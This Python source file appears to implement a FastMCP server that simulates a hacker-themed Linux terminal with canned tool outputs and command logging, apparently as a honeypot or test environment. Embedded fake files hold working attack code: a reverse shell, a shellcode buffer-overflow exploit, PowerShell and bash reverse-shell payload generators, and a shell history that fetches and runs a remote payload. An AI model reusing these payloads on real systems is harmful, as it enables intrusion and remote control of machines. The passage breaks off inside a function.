import random
import os
import time
import logging
from datetime import datetime, timedelta
from fastmcp import FastMCP

# Set up logging to current directory instead of root
import os
log_dir = os.path.dirname(os.path.abspath(__file__))

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(log_dir, 'terminal_session.log')),
        logging.StreamHandler()
    ]
)

# Create FastMCP server
mcp = FastMCP("Terminal")

# Enhanced file system structure with hacker-like directories
filesystem = {
    "/": ["home", "usr", "var", "tmp", "etc", "bin", "lib", "opt", "root", "dev", "proc", "sys"],
    "/home": ["user", "admin", "guest", "kali", "user"],
    "/home/user": ["documents", "downloads", "desktop", "projects", ".ssh", ".config", ".bash_history", "tools", "exploits", "payloads", ".hidden"],
    "/home/user/documents": ["meeting_notes.md", "proposal_draft.docx", "financial_report.xlsx", "presentation.pptx", "contract.pdf", "targets.txt", "credentials.txt"],
    "/home/user/downloads": ["chrome_installer.dmg", "dataset.csv", "wallpaper.jpg", "music_album.zip", "software_update.pkg", "metasploit.tar.gz", "nmap-7.94.tar.bz2"],
    "/home/user/projects": ["web_scraper", "data_analysis", "mobile_app", "automation_scripts", "pentesting", "reverse_shell", "keylogger"],
    "/home/user/projects/web_scraper": ["main.py", "requirements.txt", "config.yaml", "scraper.py", "data_processor.py", "README.md"],
    "/home/user/projects/pentesting": ["nmap_scan.py", "exploit.py", "payload_generator.py", "bruteforce.py", "sql_injection.py", "xss_scanner.py"],
    "/home/user/projects/reverse_shell": ["client.py", "server.py", "obfuscated.py", "persistence.py"],
    "/home/user/tools": ["nmap", "metasploit", "burpsuite", "wireshark", "john", "hashcat", "sqlmap", "nikto", "hydra", "aircrack-ng"],
    "/home/user/exploits": ["buffer_overflow.py", "privilege_escalation.sh", "web_exploits.py", "0day.py", "ransomware.py"],
    "/home/user/payloads": ["reverse_tcp.py", "bind_shell.py", "meterpreter.py", "persistence.bat", "keylogger.exe"],
    "/home/user/.hidden": [".backdoor.py", ".rootkit.so", ".encrypted_keys", ".steganography", ".covert_channel"],
    "/home/user/desktop": ["todo.txt", "quick_notes.txt", "screenshot.png", "network_diagram.png"],
    "/usr": ["bin", "lib", "share", "local", "sbin"],
    "/usr/bin": ["python3", "git", "curl", "vim", "nano", "grep", "find", "nmap", "netstat", "ss", "iptables", "tcpdump"],
    "/var": ["log", "cache", "tmp", "spool", "lib"],
    "/var/log": ["system.log", "auth.log", "access.log", "error.log", "secure.log", "messages"],
    "/etc": ["passwd", "shadow", "hosts", "resolv.conf", "ssh", "apache2", "nginx"],
    "/root": [".bash_history", ".ssh", "tools", "scripts", ".config"],
    "/tmp": ["payload.py", "exploit.sh", "dump.txt", "session_12345"]
}

# Global state
current_dir = "/home/user"
command_history = []
session_start_time = datetime.now()

# Enhanced realistic file contents with hacker-themed content
file_contents = {
    "targets.txt": """# High Value Targets - Q3 2024
192.168.1.100 - Windows Server 2019 - Domain Controller
192.168.1.101 - Ubuntu 20.04 - Web Server (Apache)
192.168.1.102 - CentOS 7 - Database Server (MySQL)
10.0.0.50 - Cisco Router - Firmware v15.1
172.16.0.10 - Windows 10 - CEO Workstation
external.company.com - Load Balancer
mail.company.com - Exchange Server

# Notes:
- DC has SMBv1 enabled (possible EternalBlue)
- Web server running outdated PHP 7.2
- MySQL root password likely default
- CEO workstation has RDP enabled
""",
    "credentials.txt": """# Collected Credentials - CONFIDENTIAL
admin:password123
root:toor
administrator:P@ssw0rd!
john.doe:company123
webadmin:webpass
dbuser:mysql123
backup:backup2024
guest:guest
sa:sql_admin_2024
cisco:cisco123

# Hash dumps:
admin:$6$rounds=656000$YQKzUPyF$8wJX.Qy...
root:$1$Ey2eG5bM$2.5V8H2JgEpaw8nF...
""",
    "nmap_scan.py": """#!/usr/bin/env python3
import subprocess
import sys
import json
from datetime import datetime

def scan_network(target, scan_type="basic"):
    \"\"\"
    Network reconnaissance tool
    \"\"\"
    print(f"[+] Starting scan of {target}")
    print(f"[+] Scan type: {scan_type}")
    print(f"[+] Timestamp: {datetime.now()}")
    
    if scan_type == "stealth":
        cmd = f"nmap -sS -O -sV --script=vuln {target}"
    elif scan_type == "aggressive":
        cmd = f"nmap -A -T4 -sV -sC {target}"
    else:
        cmd = f"nmap -sT -p- {target}"
    
    try:
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python nmap_scan.py <target> [scan_type]")
        sys.exit(1)
    
    target = sys.argv[1]
    scan_type = sys.argv[2] if len(sys.argv) > 2 else "basic"
    
    results = scan_network(target, scan_type)
    print(results)
    
    # Save results
    with open(f"scan_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M')}.txt", "w") as f:
        f.write(results)
""",
    "reverse_shell.py": """#!/usr/bin/env python3
import socket
import subprocess
import os
import threading
import base64

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            return False
    
    def send_data(self, data):
        try:
            self.socket.send(data.encode())
        except:
            pass
    
    def receive_commands(self):
        while True:
            try:
                command = self.socket.recv(1024).decode().strip()
                if command.lower() == 'exit':
                    break
                elif command.startswith('cd'):
                    try:
                        os.chdir(command[3:])
                        self.send_data(f"Changed directory to {os.getcwd()}\\n")
                    except:
                        self.send_data("Failed to change directory\\n")
                else:
                    output = subprocess.getoutput(command)
                    self.send_data(output + "\\n")
            except:
                break
        
        self.socket.close()

# Usage: python reverse_shell.py
if __name__ == "__main__":
    shell = ReverseShell("192.168.1.100", 4444)
    if shell.connect():
        shell.receive_commands()
""",
    "exploit.py": """#!/usr/bin/env python3
# Buffer Overflow Exploit - CVE-2024-XXXX
import socket
import struct
import sys

def create_payload():
    # NOP sled
    nops = b"\\x90" * 100
    
    # Shellcode (reverse shell)
    shellcode = (
        b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3"
        b"\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
    )
    
    # Return address (adjust for target)
    ret_addr = struct.pack("<I", 0x41414141)
    
    # Buffer overflow
    buffer = b"A" * 268 + ret_addr + nops + shellcode
    
    return buffer

def exploit_target(target_ip, target_port):
    try:
        print(f"[+] Connecting to {target_ip}:{target_port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, int(target_port)))
        
        payload = create_payload()
        print(f"[+] Sending payload ({len(payload)} bytes)")
        
        s.send(payload)
        response = s.recv(1024)
        
        print(f"[+] Response: {response}")
        s.close()
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_ip> <target_port>")
        sys.exit(1)
    
    exploit_target(sys.argv[1], sys.argv[2])
""",
    ".bash_history": """cd /tmp
wget http://192.168.1.50/payload.py
python3 payload.py
rm payload.py
nmap -sS 192.168.1.0/24
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
sqlmap -u "http://target.com/login.php" --dbs
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit
nc -lvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
""",
    "meeting_notes.md": """# Security Assessment Meeting - July 17, 2024

## Attendees
- Sarah (Security Lead)
- Mike (Penetration Tester)
- Alex (Network Admin)
- Me (Red Team)

## Findings
- [x] Multiple SQL injection vulnerabilities found
- [x] Weak password policies across domain
- [ ] Privilege escalation paths identified
- [ ] Social engineering assessment pending
- [x] Network segmentation bypass successful

## Action Items
- [ ] Patch web applications by Friday
- [ ] Implement network monitoring
- [ ] Update firewall rules
- [x] Deploy honeypots in DMZ
- [ ] Schedule phishing simulation

## Next Meeting: July 24, 2024
## Classified: Internal Use Only
""",
    "payload_generator.py": """#!/usr/bin/env python3
import base64
import random
import string

def generate_powershell_payload(ip, port):
    payload = f'''
    $client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }};
    $client.Close()
    '''
    
    encoded = base64.b64encode(payload.encode('utf-16le')).decode()
    return f"powershell -enc {encoded}"

def generate_bash_payload(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def obfuscate_payload(payload):
    # Simple XOR obfuscation
    key = random.randint(1, 255)
    obfuscated = ''.join(chr(ord(c) ^ key) for c in payload)
    return base64.b64encode(obfuscated.encode()).decode(), key

if __name__ == "__main__":
    print("Payload Generator v2.1")
    print("1. PowerShell Reverse Shell")
    print("2. Bash Reverse Shell")
    print("3. Obfuscated Payload")
"""
}

# Network and system information for realistic responses
NETWORK_INTERFACES = [
    ("lo", "127.0.0.1", "00:00:00:00:00:00"),
    ("eth0", f"192.168.1.{random.randint(100, 200)}", f"02:42:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}"),
    ("wlan0", f"10.0.0.{random.randint(100, 200)}", f"ac:bc:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}:{random.randint(10, 99):02x}"),
]

def write_to_bash_history(command: str):
    """Write command to bash history file"""
    try:
        log_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(log_dir, '.bash_history'), 'a') as f:
            f.write(f"{command}\n")
    except Exception as e:
        logging.error(f"Failed to write to bash history: {e}")

def write_session_log(command: str, output: str):
    """Write detailed session log"""
    try:
        log_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(log_dir, 'terminal_session.txt'), 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {current_dir}$ {command}\n")
            if output:
                f.write(f"{output}\n")
            f.write("\n")
    except Exception as e:
        logging.error(f"Failed to write session log: {e}")

def get_file_content(filename: str) -> str:
    """Get content for specified file"""
    if filename in file_contents:
        return file_contents[filename]
    
    # Generate content based on file type and context
    if filename.endswith('.py'):
        if 'exploit' in filename.lower() or 'hack' in filename.lower():
            return f"""#!/usr/bin/env python3
# {filename} - Exploit Framework
# WARNING: For authorized testing only

import socket
import sys
import struct
import subprocess
from datetime import datetime

class ExploitFramework:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.banner = '''
 ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
 ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
 █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
 ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
 ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
        '''
    
    def run_exploit(self):
        print(self.banner)
        print(f"[+] Target: {{self.target}}:{{self.port}}")
        print(f"[+] Timestamp: {{datetime.now()}}")
        # Exploit code here

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python {filename} <target> <port>")
        sys.exit(1)
    exploit = ExploitFramework(sys.argv[1], sys.argv[2])
    exploit.run_exploit()
"""
        else:
            return f"""#!/usr/bin/env python3
\"\"\"
{filename} - Generated on {datetime.now().strftime('%Y-%m-%d')}
\"\"\"

import os
import sys
from datetime import datetime

def main():
    print("Initializing {filename}...")
    # Add your code here
    pass

if __name__ == "__main__":
    main()
"""
    elif filename.endswith('.txt'):
        if 'target' in filename.lower() or 'credential' in filename.lower():
            return f"""# {filename.replace('.txt', '').replace('_', ' ').title()}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Classification: CONFIDENTIAL

192.168.1.{random.randint(10, 100)} - Windows Server - Port 445 open
10.0.0.{random.randint(10, 50)} - Linux Server - SSH enabled
172.16.0.{random.randint(10, 30)} - Database Server - MySQL 5.7

# Credentials Found:
admin:{random.choice(['password123', 'admin', 'P@ssw0rd!', 'changeme'])}
root:{random.choice(['toor', 'password', 'root123', 'letmein'])}
user:{random.choice(['user123', 'welcome', 'password1', '123456'])}

# Notes:
- SMBv1 enabled on Windows targets
- Default credentials still active
- Weak password policy detected
"""
        else:
            return f"""# {filename.replace('.txt', '').replace('_', ' ').title()}
Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Last modified: {(datetime.now() - timedelta(hours=random.randint(1, 48))).strftime('%Y-%m-%d %H:%M:%S')}

Entry 1: {random.choice(['Network scan completed', 'Vulnerability found', 'Access gained', 'Payload deployed'])}
Entry 2: {random.choice(['Privilege escalation successful', 'Data exfiltration initiated', 'Persistence established', 'Cleanup completed'])}
Entry 3: {random.choice(['Mission objective achieved', 'Evidence removed', 'Backdoor installed', 'Report generated'])}
"""
    elif filename.endswith('.log'):
        return f"""[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] INFO: System startup
[{(datetime.now() - timedelta(minutes=30)).strftime('%Y-%m-%d %H:%M:%S')}] WARNING: Failed login attempt from 192.168.1.{random.randint(100, 200)}
[{(datetime.now() - timedelta(minutes=25)).strftime('%Y-%m-%d %H:%M:%S')}] ERROR: Service authentication failed
[{(datetime.now() - timedelta(minutes=20)).strftime('%Y-%m-%d %H:%M:%S')}] INFO: Network connection established
[{(datetime.now() - timedelta(minutes=15)).strftime('%Y-%m-%d %H:%M:%S')}] WARNING: Unusual network traffic detected
[{(datetime.now() - timedelta(minutes=10)).strftime('%Y-%m-%d %H:%M:%S')}] INFO: Process spawned: /tmp/payload.py
[{(datetime.now() - timedelta(minutes=5)).strftime('%Y-%m-%d %H:%M:%S')}] CRITICAL: Unauthorized access detected
"""
    else:
        return f"""Binary file: {filename}
Size: {random.randint(1024, 1024*1024)} bytes
Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Type: {filename.split('.')[-1] if '.' in filename else 'unknown'}
MD5: {random.randbytes(16).hex()}
SHA256: {random.randbytes(32).hex()}
"""

def execute_command(command: str) -> str:
    """Execute terminal command and return output"""
    global current_dir, command_history
    
    cmd = command.strip()
    
    # Log the command
    logging.info(f"Command executed: {cmd} (cwd: {current_dir})")
    
    # Write to bash history file
    write_to_bash_history(cmd)
    
    # Ensure command_history is a list
    if not isinstance(command_history, list):
        command_history = []
    
    command_history.append(cmd)
    
    # Handle hacker-specific commands first
    if cmd.startswith("nmap "):
        target = cmd.split()[-1] if len(cmd.split()) > 1 else "127.0.0.1"
        ports = [22, 23, 53, 80, 110, 135, 139, 443, 445, 993, 995, 3389, 5900]
        open_ports = random.sample(ports, random.randint(3, 8))
        
        result = f"""Starting Nmap 7.94 ( https://nmap.org ) at {datetime.now().strftime('%Y-%m-%d %H:%M %Z')}
Nmap scan report for {target}
Host is up ({random.uniform(0.001, 0.1):.3f}s latency).
Not shown: {1000 - len(open_ports)} closed ports
PORT     STATE SERVICE
"""
        for port in sorted(open_ports):
            service = {22: "ssh", 23: "telnet", 53: "domain", 80: "http", 110: "pop3", 
                      135: "msrpc", 139: "netbios-ssn", 443: "https", 445: "microsoft-ds", 
                      993: "imaps", 995: "pop3s", 3389: "ms-wbt-server", 5900: "vnc"}
            result += f"{port}/tcp  open  {service.get(port, 'unknown')}\n"
        
        result += f"\nNmap done: 1 IP address (1 host up) scanned in {random.uniform(5.0, 30.0):.2f} seconds"
        return result
    
    elif cmd.startswith("netstat"):
        connections = [
            ("tcp", "0.0.0.0:22", "0.0.0.0:*", "LISTEN"),
            ("tcp", "0.0.0.0:80", "0.0.0.0:*", "LISTEN"),
            ("tcp", "127.0.0.1:3306", "0.0.0.0:*", "LISTEN"),
            (f"tcp", f"192.168.1.{random.randint(100, 200)}:443", f"93.184.216.{random.randint(1, 254)}:80", "ESTABLISHED"),
            ("udp", "0.0.0.0:53", "0.0.0.0:*", ""),
        ]
        
        result = "Active Internet connections (only servers)\n"
        result += "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
        for proto, local, foreign, state in connections:
            result += f"{proto:<5} {0:6} {0:6} {local:<23} {foreign:<23} {state}\n"
        return result
    
    elif cmd.startswith("ss "):
        return """Netid  State      Recv-Q Send-Q Local Address:Port                Peer Address:Port
tcp    LISTEN     0      128    0.0.0.0:22                       0.0.0.0:*
tcp    LISTEN     0      80     0.0.0.0:80                       0.0.0.0:*
tcp    ESTAB      0      0      192.168.1.100:22                192.168.1.50:54321
tcp    ESTAB      0      52     192.168.1.100:443               8.8.8.8:443
udp    UNCONN     0      0      0.0.0.0:53                       0.0.0.0:*"""
    
    elif cmd.startswith("ifconfig") or cmd == "ip addr":
        result = ""
        for iface, ip, mac in NETWORK_INTERFACES:
            if iface == "lo":
                result += f"""{iface}: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets {random.randint(1000, 9999)}  bytes {random.randint(100000, 999999)} ({random.randint(100, 999)}.{random.randint(0, 9)} KB)
        TX packets {random.randint(1000, 9999)}  bytes {random.randint(100000, 999999)} ({random.randint(100, 999)}.{random.randint(0, 9)} KB)

"""
            else:
                result += f"""{iface}: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet {ip}  netmask 255.255.255.0  broadcast {'.'.join(ip.split('.')[:-1])}.255
        inet6 fe80::{mac.replace(':', '')}:1234:5678  prefixlen 64  scopeid 0x20<link>
        ether {mac}  txqueuelen 1000  (Ethernet)
        RX packets {random.randint(10000, 99999)}  bytes {random.randint(1000000, 9999999)} ({random.randint(1000, 9999)}.{random.randint(0, 9)} MB)
        TX packets {random.randint(10000, 99999)}  bytes {random.randint(1000000, 9999999)} ({random.randint(1000, 9999)}.{random.randint(0, 9)} MB)
        collisions 0  rxmissed 0  carriers 0

"""
        return result.strip()
    
    elif cmd.startswith("iptables -L"):
        return """Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere            
INPUT_direct  all  --  anywhere             anywhere            
INPUT_ZONES_SOURCE  all  --  anywhere             anywhere            
INPUT_ZONES  all  --  anywhere             anywhere            
DROP       all  --  anywhere             anywhere             ctstate INVALID
REJECT     all  --  anywhere             anywhere             reject-with icmp-host-prohibited

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere            
FORWARD_direct  all  --  anywhere             anywhere            
FORWARD_ZONES_SOURCE  all  --  anywhere             anywhere            
FORWARD_ZONES  all  --  anywhere             anywhere            
DROP       all  --  anywhere             anywhere             ctstate INVALID
REJECT     all  --  anywhere             anywhere             reject-with icmp-host-prohibited"""
    
    elif cmd.startswith("tcpdump"):
        interface = "eth0"
        if "-i" in cmd:
            parts = cmd.split()
            try:
                idx = parts.index("-i")
                if idx + 1 < len(parts):
                    interface = parts[idx + 1]
            except ValueError:
                pass
        
        packets = []
        for i in range(5):
            timestamp = (datetime.now() + timedelta(seconds=i)).strftime("%H:%M:%S.%f")[:-3]
            src_ip = f"192.168.1.{random.randint(1, 254)}"
            dst_ip = f"192.168.1.{random.randint(1, 254)}"
            protocol = random.choice(["TCP", "UDP", "ICMP"])
            port = random.randint(1024, 65535)
            packets.append(f"{timestamp} IP {src_ip}.{port} > {dst_ip}.80: Flags [S], seq {random.randint(1000000000, 4000000000)}, win {random.randint(1000, 65535)}, length {random.randint(0, 1500)}")
        
        return f"tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on {interface}, link-type EN10MB (Ethernet), capture size 262144 bytes\n" + "\n".join(packets)
    
    elif cmd == "lscpu":
        return f"""Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
CPU(s):                          {random.randint(4, 16)}
On-line CPU(s) list:             0-{random.randint(3, 15)}
Thread(s) per core:              2
Core(s) per socket:              {random.randint(2, 8)}
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       GenuineIntel
CPU family:                      6
Model:                           142
Model name:                      Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz
Stepping:                        10
CPU MHz:                         {random.randint(1800, 3200)}.{random.randint(100, 999)}
BogoMIPS:                        {random.randint(3800, 6400)}.{random.randint(10, 99)}
Virtualization:                  VT-x
L1d cache:                       32K
L1i cache:                       32K
L2 cache:                        256K
L3 cache:                        8192K"""
    
    elif cmd.startswith("john "):
        return f"""Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{random.choice(['password', 'admin', '123456', 'letmein', 'qwerty'])}     (admin)
1g 0:00:00:0{random.randint(1, 9)} DONE (2024-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} {random.randint(10, 23)}:{random.randint(10, 59)}) {random.randint(100, 999)}g/s {random.randint(10000, 99999)}p/s {random.randint(10000, 99999)}c/s {random.randint(10000, 99999)}C/s password
Use the "--show" option to display all of the cracked passwords reliably
Session completed"""
    
    elif cmd.startswith("hashcat "):
        return f"""hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
========================================================================
* Device #1: Intel(R) UHD Graphics 620, {random.randint(1000, 4000)}/4096 MB (1365 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

{random.randbytes(16).hex()}:{random.choice(['password123', 'admin', 'welcome', 'qwerty123'])}
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: {random.randbytes(16).hex()}
Time.Started.....: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')} ({random.randint(1, 10)} secs ago)
Time.Estimated...: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')} (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  {random.randint(10000, 99999)} H/s ({random.randint(1, 10)}.{random.randint(10, 99)}ms) @ Accel:1024 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: {random.randint(10000, 50000)}/14344385 ({random.uniform(0.1, 1.0):.2f}%)
Rejected.........: 0/{random.randint(10000, 50000)} (0.00%)
Restore.Point....: {random.randint(10000, 50000)}/14344385 ({random.uniform(0.1, 1.0):.2f}%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: {random.choice(['password', 'admin', 'welcome', 'qwerty'])} -> {random.choice(['password123', 'admin123', 'welcome123', 'qwerty123'])}

Started: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}
Stopped: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}"""
    
    elif cmd.startswith("sqlmap "):
        return f"""        ___
       __H__
 ___ ___[.]_____ ___ ___  {{1.7.2#stable}}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ {datetime.now().strftime('%H:%M:%S')} /2024-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}/

[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing connection to the target URL
[{datetime.now().strftime('%H:%M:%S')}] [INFO] checking if the target is protected by some kind of WAF/IPS
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing if the target URL content is stable
[{datetime.now().strftime('%H:%M:%S')}] [INFO] target URL content is stable
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing if GET parameter 'id' is dynamic
[{datetime.now().strftime('%H:%M:%S')}] [INFO] GET parameter 'id' appears to be dynamic
[{datetime.now().strftime('%H:%M:%S')}] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[{datetime.now().strftime('%H:%M:%S')}] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing 'Generic inline queries'
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[{datetime.now().strftime('%H:%M:%S')}] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[{datetime.now().strftime('%H:%M:%S')}] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[{datetime.now().strftime('%H:%M:%S')}] [INFO] automatically extending ranges to optimize injection
[{datetime.now().strftime('%H:%M:%S')}] [INFO] target URL appears to have 3 columns in query
[{datetime.now().strftime('%H:%M:%S')}] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5678=5678

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 2967 FROM (SELECT(SLEEP(5)))abc)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x4a6d4c6e6a426b4d4a4a6c6e6a426b4d,0x7178627071)-- -
---"""
    
    elif cmd.startswith("hydra "):
        targets = ["ssh", "ftp", "telnet", "http-post-form", "rdp"]
        target_service = next((t for t in targets if t in cmd), "ssh")
        attempts = random.randint(50, 200)
        successful = random.randint(1, 5) if random.random() > 0.7 else 0
        
        result = f"""Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
[WARNING] Many {target_service} configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, {attempts} login tries (l:{random.randint(5, 20)}/p:{random.randint(10, 50)}), ~{attempts//16} tries per task
[DATA] attacking {target_service}://192.168.1.100:22/
"""
        
        if successful > 0:
            for i in range(successful):
                username = random.choice(['admin', 'root', 'user', 'guest', 'administrator'])
                password = random.choice(['password', '123456', 'admin', 'password123', 'letmein'])
                result += f"[22][{target_service}] host: 192.168.1.100   login: {username}   password: {password}\n"
        
        result += f"1 of 1 target successfully completed, {successful} valid password{'s' if successful != 1 else ''} found"
        return result
    
    elif cmd == "whoami":
        return "user"
    
    elif cmd == "id":
        return f"uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)"
    
    elif cmd.startswith("sudo "):
        sudo_cmd = cmd[5:]
        return f"[sudo] password for user: \n{execute_command(sudo_cmd)}"
    
    # Standard commands from original code
    elif cmd == "ls" or cmd.startswith("ls "):
        files = filesystem.get(current_dir, [])
        
        if "-la" in cmd or "-al" in cmd:
            output = f"total {len(files) * 8}\n"
            # Add hidden files
            hidden_files = [".bash_history", ".ssh", ".config", ".bashrc", ".profile"]
            all_files = ["."] + [".."] + hidden_files + files
            for file in all_files:
                if file.startswith('.') and file not in ['.', '..']:
                    size = random.randint(100, 2000)
                    perms = "-rw-------" if file in [".bash_history", ".ssh"] else "-rw-r--r--"
                else:
                    size = random.randint(500, 8000) if not file.startswith('.') else random.randint(100, 1000)
                    if file.endswith(('.py', '.txt', '.md', '.json', '.yaml', '.csv')):
                        perms = "-rw-r--r--"
                    else:
